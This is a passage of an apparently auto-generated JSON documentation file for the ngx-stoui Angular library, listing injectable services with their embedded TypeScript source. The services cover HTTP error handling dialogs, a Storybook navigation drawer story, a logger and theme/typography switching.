            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nGlobal handler. This method will try (in order): passed in handler -> custom handler -> default handler for code -> defaultHandler\nAll errors are passed to a dialog to be displayed there, and will by default have a simple \"OK\" button to close.\n",
            "description": "<p>Global handler. This method will try (in order): passed in handler -&gt; custom handler -&gt; default handler for code -&gt; defaultHandler\nAll errors are passed to a dialog to be displayed there, and will by default have a simple &quot;OK&quot; button to close.</p>\n",
            "jsdoctags": [
              {
                "name": {
                  "pos": 1201,
                  "end": 1204,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "err"
                },
                "type": "HttpErrorResponse",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "pos": 1195,
                  "end": 1200,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              },
              {
                "name": {
                  "pos": 1218,
                  "end": 1225,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "handler"
                },
                "type": "Handler",
                "deprecated": false,
                "deprecationMessage": "",
                "optional": true,
                "tagName": {
                  "pos": 1212,
                  "end": 1217,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": ""
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Inject, Injectable, Optional } from '@angular/core';\r\nimport { HttpErrorResponse } from '@angular/common/http';\r\nimport { Action, HttpError } from './http-error';\r\nimport { ErrorHandler, ErrorLogger, Handler } from './error-handler';\r\nimport { ErrorDialogService } from './error-dialog.service';\r\nimport { CUSTOM_ERROR_HANDLER, ERROR_LOGGER } from './token';\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\n/**\r\n * Service used to handle errors across our applications. Replaces the previous HttpErrorHandler\r\n */\r\nexport class ErrorHandlerService implements ErrorHandler {\r\n\r\n  constructor(\r\n    private errorDialogService: ErrorDialogService,\r\n    // Optional custom error handler.\r\n    @Optional() @Inject(CUSTOM_ERROR_HANDLER) private customHandler: ErrorHandler,\r\n    // Optional logger. Nothing is logged if logger is not provided.\r\n    @Optional() @Inject(ERROR_LOGGER) private logger: ErrorLogger,\r\n  ) {\r\n  }\r\n\r\n  /**\r\n   * Global handler. This method will try (in order): passed in handler -> custom handler -> default handler for code -> defaultHandler\r\n   * All errors are passed to a dialog to be displayed there, and will by default have a simple \"OK\" button to close.\r\n   * @param err\r\n   * @param handler\r\n   */\r\n  handler(err: HttpErrorResponse, handler?: Handler) {\r\n    let fn: Handler | undefined;\r\n    let actions: Action[] = [];\r\n    fn = handler;\r\n    if ( !fn && this.customHandler ) {\r\n      fn = this.customHandler[ err.status ] || this.customHandler.defaultHandler;\r\n    }\r\n    if ( !fn ) {\r\n      fn = this[ err.status ] || this.defaultHandler as Handler;\r\n      actions = [\r\n        { label: 'OK' }\r\n      ];\r\n    }\r\n    // Ensure we bind the function to the correct context.\r\n    const error = fn.bind(this)(err);\r\n    // Add a default \"OK\" action, but only if the global handlers are used.\r\n    // OK is also shown if no actions are passed in.\r\n    error.actions = [ ...actions, ...error.actions ];\r\n    if ( this.logger ) {\r\n      // Apply logger if available.\r\n      this.logger.log(error);\r\n    }\r\n    this.errorDialogService.open(error);\r\n  }\r\n\r\n  // Fallback handler if unknown code\r\n  defaultHandler(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = `Application error`;\r\n    const errorText = this.getErrorText(err);\r\n    error.text = `The application experienced an unknown or unexpected exception. The exception is listed below:\r\n    ${errorText}`;\r\n    error.actions = [\r\n      new Action('Refresh', () => window.location.reload())\r\n    ];\r\n    return error;\r\n  }\r\n\r\n  // Signature for error handlers\r\n  [ code: number ]: Handler;\r\n\r\n  0(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'No connection';\r\n    const offline = !window.navigator.onLine;\r\n    if ( offline ) {\r\n      error.text = `You are not connected to the internet.`;\r\n    } else {\r\n      error.text = `We were unable to establish a connection to the server. There can be several reasons for this:\r\n\r\n    - There was an intermittent connection loss\r\n    - The request timed out`;\r\n    }\r\n    return error;\r\n  }\r\n\r\n  400(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'Errors in submitted form';\r\n    const errorText = this.getErrorText(err);\r\n    error.text = `The form contained invalid data.\r\n\r\n    ${errorText}`;\r\n    return error;\r\n  }\r\n\r\n  401(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = `Not signed in`;\r\n    error.text = `You are not signed in or your session has expired. Please sign in and try again.`;\r\n    error.actions = [];\r\n    return error;\r\n  }\r\n\r\n  403(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = `Not authorized.`;\r\n    error.text = `You do not have access to perform this action.\r\n    Apply for the correct roles in Access IT.`;\r\n    error.actions = [\r\n      { label: 'ACCESS IT', action: () => window.open('https://accessit.equinor.com/', '_blank') }\r\n    ];\r\n    return error;\r\n  }\r\n\r\n  404(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'Item not found';\r\n    const errorText = this.getErrorText(err);\r\n    error.text = `The requested item / resource was not found.\r\n\r\n    ${errorText}\r\n    `;\r\n    return error;\r\n  }\r\n\r\n  409(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'This resource has changed';\r\n    const errorText = this.getErrorText(err);\r\n    error.text = `This resource/item has been updated on the server. Please reload and try again.\r\n\r\n    ${errorText}`;\r\n    error.actions = [\r\n      { label: 'Reload', action: () => window.location.reload() }\r\n    ];\r\n    return error;\r\n  }\r\n\r\n  500(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = `Unexpected error occurred`;\r\n    const errorText = this.getErrorText(err);\r\n    error.text = `We experienced an unknown exception. Please report this via Services @ Equinor\r\n\r\n    ${errorText}`;\r\n    error.actions = [\r\n      { label: 'Services @ Equinor', action: () => window.open(`https://equinor.service-now.com`, '_blank') }\r\n    ];\r\n    return error;\r\n  }\r\n\r\n  501(err: HttpErrorResponse) {\r\n    return this[ 500 ](err);\r\n  }\r\n\r\n  503(err: HttpErrorResponse) {\r\n    return this[ 500 ](err);\r\n  }\r\n\r\n  /**\r\n   * Uses the getErrorText from the provided custom handler, if available.\r\n   * Otherwise, return the error message, if available in our desired format\r\n   * Expected err.error -> { message: 'A message', ... }\r\n   * Also handles text as a fallback.\r\n   * */\r\n  getErrorText(err: HttpErrorResponse) {\r\n    if ( this.customHandler && this.customHandler.getErrorText ) {\r\n      return this.customHandler.getErrorText(err);\r\n    }\r\n    let errorText: string;\r\n    try {\r\n      const e = err.error instanceof Object ? err.error : JSON.parse(err.error);\r\n      errorText = e.message;\r\n    } catch ( ex ) {\r\n      errorText = typeof err.error === 'string' ? err.error : '';\r\n    }\r\n    return errorText;\r\n  }\r\n\r\n}\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "errorDialogService",
              "type": "ErrorDialogService",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "customHandler",
              "type": "ErrorHandler",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "logger",
              "type": "ErrorLogger",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 14,
          "jsdoctags": [
            {
              "name": "errorDialogService",
              "type": "ErrorDialogService",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "customHandler",
              "type": "ErrorHandler",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "logger",
              "type": "ErrorLogger",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "type": "injectable"
      },
      {
        "name": "IconService",
        "id": "injectable-IconService-5d6d04ad7c836f327208680e9798944fa32a252e6e972fa1492b79bd40a335ad300a9ba83fd3ec7c0c2f1e14bb8026764c285bae8c54146b6e1ae003c5dd4125",
        "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
        "properties": [],
        "methods": [],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\r\nimport { moduleMetadata } from '@storybook/angular';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\r\nimport { MatIconModule, MatIconRegistry } from '@angular/material/icon';\r\nimport { NavDrawerComponent, NavDrawerModule } from '@ngx-stoui/drawer';\r\nimport { RouterTestingModule } from '@angular/router/testing';\r\nimport { BrowserModule } from '@angular/platform-browser';\r\nimport { CommonModule } from '@angular/common';\r\nimport { Component, Injectable } from '@angular/core';\r\nimport { StoAppHeaderModule } from '@ngx-stoui/common';\r\n\r\n@Component({\r\n  selector: 'wrapper',\r\n  template: 'Hi'\r\n})\r\nclass WrapperComponent {\r\n}\r\n\r\n@Injectable({ providedIn: 'root' })\r\nclass IconService {\r\n  constructor(private iconReg: MatIconRegistry) {\r\n    this.iconReg.setDefaultFontSetClass('material-icons-outline');\r\n  }\r\n}\r\n\r\nexport default {\r\n  title: 'Navigation/Drawer',\r\n  component: NavDrawerComponent,\r\n  parameters: {},\r\n  decorators: [\r\n    moduleMetadata({\r\n      declarations: [ WrapperComponent ],\r\n      providers: [ IconService ],\r\n      imports: [\r\n        NavDrawerModule,\r\n        StoAppHeaderModule,\r\n        MatIconModule,\r\n        MatButtonModule,\r\n        BrowserAnimationsModule,\r\n        RouterTestingModule.withRoutes([\r\n          { path: '**', component: WrapperComponent }\r\n        ]),\r\n        BrowserModule,\r\n        CommonModule\r\n      ]\r\n    })\r\n  ],\r\n  argTypes: {\r\n    open: {\r\n      control: {type: 'boolean'}\r\n    }\r\n  }\r\n} as Meta;\r\n\r\nconst Template: Story<NavDrawerComponent> = (args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n};\r\n\r\nconst navigationItems = [\r\n  {\r\n    label: 'Direct route',\r\n    route: [ '/', 'home' ],\r\n    icon: 'home'\r\n  },\r\n  {\r\n    label: 'Internal route title',\r\n    children: [\r\n      {\r\n        route: [ '/', 'route1' ],\r\n        label: 'Internal child route',\r\n      },\r\n      {\r\n        route: [ '/', 'route2' ],\r\n        label: 'Internal child route 2',\r\n      },\r\n      {\r\n        route: [ '/', 'route3' ],\r\n        label: 'Internal child route 3',\r\n      },\r\n      {\r\n        route: [ '/', 'route4' ],\r\n        label: 'Internal child route 4',\r\n      },\r\n      {\r\n        route: [ '/', 'route5' ],\r\n        label: 'Internal child route 5',\r\n      },\r\n      {\r\n        route: [ '/', 'route6' ],\r\n        label: 'Internal child route 6',\r\n      },\r\n    ],\r\n    icon: 'dashboard',\r\n    title: 'Dashboard'\r\n  },\r\n  {\r\n    label: 'External',\r\n    children: [\r\n      {\r\n        link: 'https://example.com',\r\n        target: '_blank',\r\n        label: 'Example.com'\r\n      }\r\n    ],\r\n    icon: 'open_in_new',\r\n  },\r\n  {\r\n    link: '#',\r\n    label: 'Disabled Route',\r\n    children: [],\r\n    icon: 'do_disturb',\r\n    disabled: true\r\n  },\r\n];\r\n\r\nexport const NormalUse = (args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n};\r\nNormalUse.args = {\r\n  height: '100vh',\r\n  navigationItems,\r\n  collapsed: false\r\n};\r\n\r\n\r\nexport const WithAppHeader = (args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n    template: `\r\n    <sto-app-header></sto-app-header>\r\n    <sto-nav-drawer [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\r\n    `\r\n  };\r\n};\r\nWithAppHeader.args = {\r\n  navigationItems,\r\n  collapsed: true,\r\n};\r\n\r\n\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "iconReg",
              "type": "MatIconRegistry",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 21,
          "jsdoctags": [
            {
              "name": "iconReg",
              "type": "MatIconRegistry",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "type": "injectable"
      },
      {
        "name": "Logger",
        "id": "injectable-Logger-498d07118640af56499aaf20a9c2077b6c46bba76c932ab22263dfc299f2b7fbb43f9db943817229ad0b0c07b271332e5027c9507031fbd4d3d97378542b334b",
        "file": "libs/error-handler/src/lib/wrapper.ts",
        "properties": [],
        "methods": [
          {
            "name": "log",
            "args": [
              {
                "name": "err",
                "type": "HttpError",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 93,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "err",
                "type": "HttpError",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\r\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport {\r\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\r\n  ErrorHandlerService,\r\n  Handler,\r\n  HttpError,\r\n  StoErrorHandler\r\n} from '@ngx-stoui/error-handler';\r\n\r\n@Component({\r\n  selector: 'next-wrapper',\r\n  template: `\r\n    <button mat-button\r\n            (click)=\"overRide(404)\">Overridden 404\r\n    </button>\r\n    <button mat-button\r\n            (click)=\"showError(s)\"\r\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\r\n  `,\r\n  providers: []\r\n})\r\nexport class NextWrapperComponent {\r\n  public errors = [\r\n    0,\r\n    400,\r\n    401,\r\n    403,\r\n    404,\r\n    409,\r\n    500,\r\n    501,\r\n    503\r\n  ];\r\n\r\n  constructor(private service: ErrorHandlerService) {\r\n  }\r\n\r\n  showError(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    this.service.handler(err);\r\n  }\r\n\r\n  overRide(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    const handler = function (err: HttpErrorResponse) {\r\n      const e = new HttpError(err);\r\n      e.title = 'Local override 404';\r\n      e.text = 'Local override not found item';\r\n      return e;\r\n    };\r\n    this.service.handler(err, handler);\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class ErrorHandlerImpl implements StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  401(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'Custom not signed in';\r\n    error.text = 'Custom not signed in text';\r\n    return error;\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class Logger {\r\n  constructor(private http: HttpClient) {\r\n  }\r\n\r\n  log(err: HttpError) {\r\n    // This method will typically go to the application backend or a central log repository\r\n    console.log('Error', err);\r\n  }\r\n}\r\n\r\nfunction LoggerFactory(http: HttpClient) {\r\n  return new Logger(http);\r\n}\r\n\r\n@NgModule({\r\n  declarations: [ NextWrapperComponent ],\r\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\r\n  exports: [ NextWrapperComponent ],\r\n  providers: [\r\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\r\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\r\n  ]\r\n})\r\nexport class WrapperModule {\r\n}\r\n\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "http",
              "type": "HttpClient",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 89,
          "jsdoctags": [
            {
              "name": "http",
              "type": "HttpClient",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "type": "injectable"
      },
      {
        "name": "StoThemeService",
        "id": "injectable-StoThemeService-06ef0159c1b1152e0770a1886ce6bc142b04bdf6278967235bf87ee8eccc28f342cf13b040bd72a5b690645a3037188721b58288adba263a5dd8f3369e16bbd5",
        "file": "libs/common/src/lib/theme/theme.service.ts",
        "properties": [
          {
            "name": "destroyed$",
            "defaultValue": "new Subject<boolean>()",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 19,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "document",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Document",
            "optional": false,
            "description": "",
            "line": 22,
            "modifierKind": [
              121,
              144
            ]
          },
          {
            "name": "previousTheme",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "ThemeName",
            "optional": false,
            "description": "",
            "line": 17,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "previousTypography",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "TypographyName",
            "optional": false,
            "description": "",
            "line": 18,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "themeObserver",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MutationObserver",
            "optional": false,
            "description": "",
            "line": 20,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "themeSubject$",
            "defaultValue": "new BehaviorSubject<ThemeName>('light')",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 15,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "typographyObserver",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MutationObserver",
            "optional": false,
            "description": "",
            "line": 21,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "typographySubject$",
            "defaultValue": "new BehaviorSubject<TypographyName>('medium')",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 16,
            "modifierKind": [
              121
            ]
          }
        ],
        "methods": [
          {
            "name": "getActiveTheme",
            "args": [],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 67,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "getActiveTypography",
            "args": [],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 76,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "getInitialValuesFromStorage",
            "args": [],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 152,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121,
              131
            ]
          },
          {
            "name": "listenForBodyClassChangesToTheme",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 85,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ]
          },
          {
            "name": "listenForBodyClassChangesToTypography",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 120,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ]
          },
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 43,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "setTheme",
            "args": [
              {
                "name": "theme",
                "type": "ThemeName",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 50,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "theme",
                "type": "ThemeName",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "setThemeClass",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 111,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ]
          },
          {
            "name": "setTypography",
            "args": [
              {
                "name": "variant",
                "type": "TypographyName",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 59,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "variant",
                "type": "TypographyName",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "setTypographyClass",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 143,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Inject, Injectable, OnDestroy, Optional } from '@angular/core';\r\nimport { BehaviorSubject, Observable, Subject } from 'rxjs';\r\nimport { ThemeModel, ThemeName, themes, typography, TypographyName } from './models';\r\nimport { map, take, takeUntil } from 'rxjs/operators';\r\nimport { DOCUMENT } from '@angular/common';\r\nimport { THEME_SAVER, ThemeSaver, ThemeSaverService } from './theme-saver.service';\r\nimport { MatIconRegistry } from '@angular/material/icon';\r\nimport { DomSanitizer } from '@angular/platform-browser';\r\nimport { iconMap } from './svg-icons';\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class StoThemeService implements OnDestroy {\r\n  private themeSubject$ = new BehaviorSubject<ThemeName>('light');\r\n  private typographySubject$ = new BehaviorSubject<TypographyName>('medium');\r\n  private previousTheme: ThemeName;\r\n  private previousTypography: TypographyName;\r\n  private destroyed$ = new Subject<boolean>();\r\n  private themeObserver: MutationObserver;\r\n  private typographyObserver: MutationObserver;\r\n  private readonly document: Document;\r\n\r\n  constructor(@Inject(DOCUMENT) document: Document,\r\n              private iconRegistry: MatIconRegistry,\r\n              private sanitizer: DomSanitizer,\r\n              @Optional() @Inject(THEME_SAVER) private readonly saver: ThemeSaver<Observable<ThemeModel>>) {\r\n    if ( !this.saver ) {\r\n      this.saver = new ThemeSaverService();\r\n    }\r\n    this.document = document as Document;\r\n    this.listenForBodyClassChangesToTheme();\r\n    this.listenForBodyClassChangesToTypography();\r\n    this.setThemeClass();\r\n    this.setTypographyClass();\r\n    this.getInitialValuesFromStorage();\r\n    this.document.body.classList.add('mat-app-background');\r\n    this.iconRegistry.setDefaultFontSetClass('material-icons-outlined');\r\n    const icon = this.sanitizer.bypassSecurityTrustHtml(iconMap.get('equinor') as string) as string;\r\n    this.iconRegistry.addSvgIconLiteral('equinor', icon);\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n    this.themeObserver.disconnect();\r\n    this.typographyObserver.disconnect();\r\n  }\r\n\r\n  setTheme(theme: ThemeName) {\r\n    if ( !theme || !themes.has(theme) ) {\r\n      const preferDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;\r\n      theme = preferDark ? 'dark' : 'light';\r\n    }\r\n    this.themeSubject$.next(theme);\r\n    return this.saver.save({ type: 'theme', value: theme });\r\n  }\r\n\r\n  setTypography(variant: TypographyName) {\r\n    if ( !variant || !typography.has(variant) ) {\r\n      variant = 'medium';\r\n    }\r\n    this.typographySubject$.next(variant);\r\n    return this.saver.save({ type: 'typography', value: variant });\r\n  }\r\n\r\n  getActiveTheme() {\r\n    return this.themeSubject$\r\n      .asObservable()\r\n      .pipe(map(val => ( {\r\n        name: val,\r\n        className: themes.get(val)\r\n      } )));\r\n  }\r\n\r\n  getActiveTypography() {\r\n    return this.typographySubject$\r\n      .asObservable()\r\n      .pipe(map(val => ( {\r\n        name: val,\r\n        className: typography.get(val)\r\n      } )));\r\n  }\r\n\r\n  private listenForBodyClassChangesToTheme() {\r\n    const body = this.document.body;\r\n    this.themeObserver = new MutationObserver((mutations) => {\r\n      mutations.forEach(m => {\r\n        const t = m.target as HTMLBodyElement;\r\n        const darkmode = t.classList.contains('sto-dark-theme');\r\n        const themeName = darkmode ? 'dark' : 'light';\r\n        if ( this.previousTheme === themeName ) {\r\n          return;\r\n        }\r\n        this.previousTheme = themeName;\r\n        if ( darkmode ) {\r\n          this.setTheme('dark');\r\n        } else {\r\n          this.setTheme('light');\r\n        }\r\n      });\r\n    });\r\n    this.themeObserver.observe(body, {\r\n      attributes: true,\r\n      attributeFilter: [ 'class' ],\r\n      childList: false,\r\n      characterData: false\r\n    });\r\n  }\r\n\r\n  private setThemeClass() {\r\n    this.getActiveTheme()\r\n      .pipe(takeUntil(this.destroyed$))\r\n      .subscribe((theme) => {\r\n        this.document.body.classList.remove('sto-dark-theme', 'sto-light-theme');\r\n        this.document.body.classList.add(themes.get(theme.name) ?? '');\r\n      });\r\n  }\r\n\r\n  private listenForBodyClassChangesToTypography() {\r\n    const body = this.document.body;\r\n    this.typographyObserver = new MutationObserver((mutations) => {\r\n      mutations.forEach(m => {\r\n        const t = m.target as HTMLBodyElement;\r\n        const small = t.classList.contains(typography.get('small') ?? '');\r\n        const large = t.classList.contains(typography.get('large') ?? '');\r\n        const typographyName: TypographyName = small ? 'small' : large ? 'large' : 'medium';\r\n        if ( this.previousTypography === typographyName ) {\r\n          return;\r\n        }\r\n        this.previousTypography = typographyName;\r\n        this.setTypography(typographyName);\r\n      });\r\n    });\r\n    this.typographyObserver.observe(body, {\r\n      attributes: true,\r\n      attributeFilter: [ 'class' ],\r\n      childList: false,\r\n      characterData: false\r\n    });\r\n  }\r\n\r\n  private setTypographyClass() {\r\n    this.getActiveTypography()\r\n      .pipe(takeUntil(this.destroyed$))\r\n      .subscribe((typo) => {\r\n        this.document.body.classList.remove(...typography.values());\r\n        this.document.body.classList.add(typo.className ?? '');\r\n      });\r\n  }\r\n\r\n  private async getInitialValuesFromStorage() {\r\n    try {\r\n      const theme = await this.saver.load('theme')\r\n        .pipe(take(1))\r\n        .toPromise();\r\n      this.setTheme(theme.value as ThemeName);\r\n      const typo = await this.saver.load('typography')\r\n        .pipe(take(1))\r\n        .toPromise();\r\n      this.setTypography(typo.value as TypographyName);\r\n    } catch {\r\n      // gotta catch em all\r\n    }\r\n  }\r\n}\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "document",
              "type": "Document",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "iconRegistry",
              "type": "MatIconRegistry",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "sanitizer",
              "type": "DomSanitizer",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "saver",
              "type": "ThemeSaver<Observable<ThemeModel>>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 22,
          "jsdoctags": [
            {
              "name": "document",
              "type": "Document",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "iconRegistry",
              "type": "MatIconRegistry",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "sanitizer",
              "type": "DomSanitizer",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "saver",
              "type": "ThemeSaver<Observable<ThemeModel>>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "type": "injectable"
      },
      {
        "name": "StoUserPreferenceService",
        "id": "injectable-StoUserPreferenceService-b0d1d6f14b9859059fcc2311447e3cadbe67047fae53940955bd58732d2ef5f9e1bb20da88972f0690bf266681f606a38a6201e8d5b5e3994e41afeb9c017c93",
        "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
        "properties": [
          {
            "name": "default",
            "defaultValue": "{\r\n    hasSelectTextOnFocusEnabled: true\r\n  }",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "object",
            "optional": false,
            "description": "",
            "line": 13,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "hasSelectTextOnFocusEnabled",
            "defaultValue": "new BehaviorSubject<boolean>(true)",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 9,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "preferences",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "literal type",
            "optional": false,
            "description": "",
            "line": 10,
            "modifierKind": [
              123
            ]
          }
        ],
        "methods": [
          {
            "name": "getPreferences",
            "args": [],
            "optional": false,
            "returnType": "any",
            "typeParameters": [],
            "line": 36,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              123
            ]
          },
          {
            "name": "setHasSelectTextOnFocusEnabled",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 30,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              123
            ],
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
